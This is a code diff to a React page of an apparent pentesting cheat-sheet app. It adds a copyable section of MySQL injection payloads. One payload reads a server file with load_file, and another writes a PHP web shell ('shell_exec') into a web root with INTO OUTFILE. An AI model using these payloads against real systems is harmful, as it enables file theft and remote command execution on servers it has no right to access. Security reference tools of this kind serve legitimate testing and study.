@@ -19,6 +19,17 @@ export default function SQLi () {
         },
     ]
 
+    const DbInsertAndReaderFile = [
+        {
+            db_type: 'MySQL',
+            title: "'select load_file('/var/lib/mysql-files/key.txt');"
+        },
+        {
+            db_type: 'MySQL',
+            title: `select 1,2,"<?php echo shell_exec($_GET['c']);?>",4 into OUTFILE 'C:/xampp/htdocs/back.php'`
+        }
+    ]
+
     const DbVersionEnumeration = [
         {
             db_type: 'MySQL/MSSQL',
@@ -145,6 +156,23 @@ export default function SQLi () {
             <div style={{ padding: 10, marginTop: 15 }} key='a'>
                 <Title level={3}>Number of column</Title>
                 {DbColumnNumber.map( ( k, i ) => {
+                    return (
+                        <>
+                            <Paragraph key={i}>
+                                <Link href={`#${ k.db_type }`}>{k.db_type}</Link>
+                            </Paragraph>
+
+                            <Paragraph key={i}>
+                                <pre><Text copyable>{k.title}</Text></pre>
+                            </Paragraph>
+                        </>
+                    );
+                } )}
+            </div>
+            <Divider dashed />
+            <div style={{ padding: 10, marginTop: 15 }} key='a'>
+                <Title level={3}>Read and Insert File</Title>
+                {DbInsertAndReaderFile.map( ( k, i ) => {
                     return (
                         <>
                             <Paragraph key={i}>
